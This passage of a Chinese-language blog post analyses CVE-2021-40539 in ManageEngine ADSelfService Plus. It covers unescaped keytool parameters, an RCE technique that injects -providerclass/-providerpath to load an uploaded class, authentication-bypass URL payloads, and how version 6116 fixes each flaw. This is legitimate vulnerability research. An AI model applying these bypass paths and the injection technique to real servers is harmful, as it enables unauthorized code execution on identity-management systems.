<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">keyToolEscape</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (str == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        String[] chars = <span class="keyword">new</span> String[]&#123;<span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;,&quot;</span>, <span class="string">&quot;;&quot;</span>&#125;;</span><br><span class="line">        String ret = str;</span><br><span class="line">        String[] arr$ = chars;</span><br><span class="line">        <span class="keyword">int</span> len$ = chars.length;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i$ = <span class="number">0</span>; i$ &lt; len$; ++i$) &#123;</span><br><span class="line">            String s = arr$[i$];</span><br><span class="line">            <span class="keyword">if</span> (ret.contains(s)) &#123;</span><br><span class="line">                ret = ret.replaceAll(s, <span class="string">&quot;\\\\&quot;</span> + s);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    但是<code>KEY_LENGTH</code>和<code>VALIDITY</code>并没有进行转义，所以可以展开利用。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">String keyLength = sslSettings.getString(<span class="string">&quot;KEY_LENGTH&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (keyLength != <span class="keyword">null</span> &amp;&amp; !keyLength.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">    keyCmd.append(<span class="string">&quot; -keysize &quot;</span>).append(keyLength);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">String validity = sslSettings.getString(<span class="string">&quot;VALIDITY&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (validity != <span class="keyword">null</span> &amp;&amp; !validity.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">    keyCmd.append(<span class="string">&quot; -validity &quot;</span>).append(validity);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><h5 id="方法一：通过keytools加载类"><a href="#方法一：通过keytools加载类" class="headerlink" title="方法一：通过keytools加载类"></a>方法一：通过keytools加载类</h5><p>​    这个方法的原理在于<code>keytools</code>提供了下面两个参数,这里提供的类会被加载，所以可以在静态代码块中编写需要执行的代码，编译好后配合上面的文件上传漏洞上传，再通过注入<code>providerclass</code>和<code>providerpath</code>加载类以执行代码。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-providerclass &lt;providerclass&gt;  提供方类名</span><br><span class="line">-providerpath &lt;pathlist&gt;        提供方类路径</span><br></pre></td></tr></table></figure>

<h5 id="失败尝试：拼接命令"><a href="#失败尝试：拼接命令" class="headerlink" title="失败尝试：拼接命令"></a>失败尝试：拼接命令</h5><p>执行命令时可以通过<code>&amp;&amp;</code>拼接其他要执行的命令，能否直接通过<code>&amp;&amp;</code>完成命令执行呢？ </p>
<p>不可以，本来我想尝试直接闭合后面的内容后再通过<code>&amp;&amp;</code>拼接其他命令执行，但是经过查阅资料这样是不行的，只有当使用<code>cmd /c </code>时才可以使用<code>&amp;&amp;</code>拼接执行。当前后面的命令能执行成功的前提是前面的命令没有报错，如果前面的命令出错后面拼接的命令是无法执行成功的。</p>
<p><img src="/2021/11/11/CVE-2021-40539-ManageEngine-ADSelfService-Plus%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211115121825348.png" alt="image-20211115121825348"></p>
<p><img src="/2021/11/11/CVE-2021-40539-ManageEngine-ADSelfService-Plus%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211115121913866.png" alt="image-20211115121913866"></p>
<p>​    如果没有使用<code>cmd /c</code>也无法执行后面的命令</p>
<p><img src="/2021/11/11/CVE-2021-40539-ManageEngine-ADSelfService-Plus%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211115122008350.png" alt="image-20211115122008350"></p>
<h2 id="修复分析"><a href="#修复分析" class="headerlink" title="修复分析"></a>修复分析</h2><p>​    在<code>6116</code>版本中修复结果如下。</p>
<h3 id="认证绕过-1"><a href="#认证绕过-1" class="headerlink" title="认证绕过"></a>认证绕过</h3><p>​    在<code>6116</code>中，直接使用<code>/./RestAPI/LicenseMgr</code>会返回500无法测试能否绕过，经过排错，这个版本需要加上参数才能正常执行，否则不会经过过滤器。</p>
<p>​    使用<code>/xxx/../RestAPI/LicenseMgr?operation=unspecified</code>绕过，发现在<code>ADSFilter#doSubFilters</code>中存在如下代码。</p>
<p><img src="/2021/11/11/CVE-2021-40539-ManageEngine-ADSelfService-Plus%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211116140557278.png" alt="image-20211116140557278"></p>
<p>​    查看<code>isRestRequest</code>的内容，可以看到通过<code>getNormalizedURI</code>对URL经过处理后才进行正则匹配。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isRestAPIRequest</span><span class="params">(HttpServletRequest request, JSONObject filterParams)</span> </span>&#123;</span><br><span class="line">      String restApiUrlPattern = <span class="string">&quot;/RestAPI/.*&quot;</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">          restApiUrlPattern = filterParams.optString(<span class="string">&quot;API_URL_PATTERN&quot;</span>, restApiUrlPattern);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (Exception var5) &#123;</span><br><span class="line">          out.log(Level.INFO, <span class="string">&quot;Unable to get API_URL_PATTERN.&quot;</span>, var5);</span><br><span class="line">      &#125;</span><br><span class="line"><span class="comment">//处理URL</span></span><br><span class="line">      String reqURI = SecurityUtil.getNormalizedURI(request.getRequestURI());</span><br><span class="line">      String contextPath = request.getContextPath() != <span class="keyword">null</span> ? request.getContextPath() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">      reqURI = reqURI.replace(contextPath, <span class="string">&quot;&quot;</span>);</span><br><span class="line">      reqURI = reqURI.replace(<span class="string">&quot;//&quot;</span>, <span class="string">&quot;/&quot;</span>);</span><br><span class="line">      <span class="comment">//正则匹配</span></span><br><span class="line">      <span class="keyword">return</span> Pattern.matches(restApiUrlPattern, reqURI);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​    <code>getNormalizedURI</code> 会对<code>./</code>和<code>../</code>进行处理，所以无法使用这种方式绕过了。</p>
<p><img src="/2021/11/11/CVE-2021-40539-ManageEngine-ADSelfService-Plus%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211116141247296.png" alt="image-20211116141247296"></p>
<p>​    但是根据我们之前的分析，也可以通过<code>/RestAPI；/LicenseMgr?operation=unspecified</code>绕过，但也是不行的，使用上述payload返回500错误。查看配置发现URL会被<code>Security Filter</code>处理。</p>
<p><img src="/2021/11/11/CVE-2021-40539-ManageEngine-ADSelfService-Plus%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211116141853075.png" alt="image-20211116141853075"></p>
<p>​    在<code>SecurityFilter#doFilter</code>中会判断URL中是否包含<code>;</code>或者<code>%3b</code>，如果是则直接退出。</p>
<p><img src="/2021/11/11/CVE-2021-40539-ManageEngine-ADSelfService-Plus%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211116141929586.png" alt="image-20211116141929586"></p>
<h3 id="文件上传-1"><a href="#文件上传-1" class="headerlink" title="文件上传"></a>文件上传</h3><p><code>SmartCardAPI#addSmartCardConfiguration</code>不再使用<code>getFileFromRequest</code>完成上传操作，而使用<code>getFileFromMultipartRequest</code>。</p>
<p><img src="/2021/11/11/CVE-2021-40539-ManageEngine-ADSelfService-Plus%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211115150959350.png" alt="image-20211115150959350"></p>
<p><code>getFileFromMultipartRequest</code>虽然还是会进行文件上传操作，但是上传路径和名称都不可控。</p>
<p><img src="/2021/11/11/CVE-2021-40539-ManageEngine-ADSelfService-Plus%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211115151040207.png" alt="image-20211115151040207"></p>
<h3 id="命令执行-1"><a href="#命令执行-1" class="headerlink" title="命令执行"></a>命令执行</h3><p><code>createCSR</code>已经不再使用拼接命令的方式创建证书，因此也不存在命令执行漏洞。</p>
<p><img src="/2021/11/11/CVE-2021-40539-ManageEngine-ADSelfService-Plus%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211115151505484.png" alt="image-20211115151505484"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​    这个漏洞的权限认证绕过和文件上传其实比较普通，作者发现的受限的命令执行配合文件上传导致RCE的过程算是这个洞的亮点吧。之前分析认证绕过的地方有些错误，感谢<code>killer</code>师傅指正。</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul>
<li><a target="_blank" rel="noopener" href="https://www.synacktiv.com/publications/how-to-exploit-cve-2021-40539-on-manageengine-adselfservice-plus.html">HOW TO EXPLOIT CVE-2021-40539 ON MANAGEENGINE ADSELFSERVICE PLUS</a></li>
</ul>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    
      

    <span class="post-categories">
      <i class="icon-categories"></i>
        <a href="/categories/漏洞分析/">漏洞分析</a>
    </span>
    

    

    </div>

    
  </div>
</article>

  






    </main>

    <footer class="site-footer">
  <p class="site-info">
    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
    </br>
    
    &copy; 2021 藏青
    
  </p>
</footer>
    
    
  </div>
</div>
</body>
</html>